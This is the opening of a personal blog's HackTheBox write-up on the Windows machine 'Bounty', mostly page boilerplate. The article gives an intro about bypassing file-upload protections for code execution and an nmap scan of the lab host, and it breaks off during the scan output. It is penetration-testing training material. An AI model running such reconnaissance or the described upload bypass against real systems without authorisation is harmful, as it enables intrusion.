@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">pL4StiC - Htb Bounty</title>
+<meta property="og:title" content=pL4StiC&#32;-&#32;Htb&#32;Bounty />
+<meta name="twitter:title" content=pL4StiC&#32;-&#32;Htb&#32;Bounty />
+<meta itemprop="name" content=pL4StiC&#32;-&#32;Htb&#32;Bounty />
+<meta name="application-name" content=pL4StiC&#32;-&#32;Htb&#32;Bounty />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="https://pL4sTiC1337.github.io/writeups/htb-bounty/" />
+<link rel="canonical" href="https://pL4sTiC1337.github.io/writeups/htb-bounty/" itemprop="url" />
+<meta name="url" content="https://pL4sTiC1337.github.io/writeups/htb-bounty/" />
+<meta name="twitter:url" content="https://pL4sTiC1337.github.io/writeups/htb-bounty/" />
+<meta property="og:url" content="https://pL4sTiC1337.github.io/writeups/htb-bounty/" />
+
+
+<meta property="og:updated_time" content="2025-02-14T11:11:01-05:00" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='https://pL4sTiC1337.github.io/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+  
+    <meta name="twitter:site" content="@pL4sTiC1337" />
+    <meta name="twitter:creator" content="@pL4sTiC1337" />
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.143.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.cca58c146f4edc10af613962d5043d66deb02f90a09c9f14c98adf9418774835.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="https://pL4sTiC1337.github.io/">
+                <img src="/images/pl4stic.png" alt="brand image">
+            </a>
+        
+        
+            <a href="https://pL4sTiC1337.github.io/">
+                <h1>pL4StiC</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    My Ramblings...
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/posts/dark-side-of-wifi/">The Dark Side of WiFi</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/posts/the-age-of-uts/">The Age of Ubiquitous Surveillance</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/posts/the-rfid-badge-capture/">The RFID Badge Capture</a>
+                            </li>
+                        
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-bounty/">Htb Bounty</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-cascade/">HtB Cascade</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-escape/">HtB Escape</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-giddy/">HtB Giddy</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-faculty/">HtB Faculty</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/pL4sTiC1337">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+
+
+    <a target="_blank" class="social" title="X" href="https://x.com/pL4sTiC1337">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
+            <path fill="currentColor" d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/r/p/pL4sTiC">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
+            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2025 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="https://pL4sTiC1337.github.io/writeups/htb-bounty/">Htb Bounty</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-02-14T11:11:01-0500" class="post-date">
+        February 14, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>7 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-writeup">
+        <a href="https://pL4sTiC1337.github.io/tags/writeup">writeup</a>
+      </li>
+      
+      <li class="tag-hackthebox">
+        <a href="https://pL4sTiC1337.github.io/tags/hackthebox">hackthebox</a>
+      </li>
+      
+      <li class="tag-easy">
+        <a href="https://pL4sTiC1337.github.io/tags/easy">easy</a>
+      </li>
+      
+      <li class="tag-windows">
+        <a href="https://pL4sTiC1337.github.io/tags/windows">windows</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p><img src="/images/Bounty.png" alt="HtB-Bounty"></p>
+<p>Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches.</p>
+<hr>
+<h2 id="scanning">Scanning</h2>
+<h3 id="nmap">nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/bounty<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -T4 -p- -A 10.129.96.100                                                     
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-14 09:10 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.96.100
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.025s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 7.5
+</span></span><span style="display:flex;"><span>|_http-title: Bounty
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.5
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose|phone|specialized
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2008|7|Vista|Phone|2012|8.1 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows <span style="color:#ae81ff">7</span> SP1 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Vista or Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Embedded Standard <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Server <span 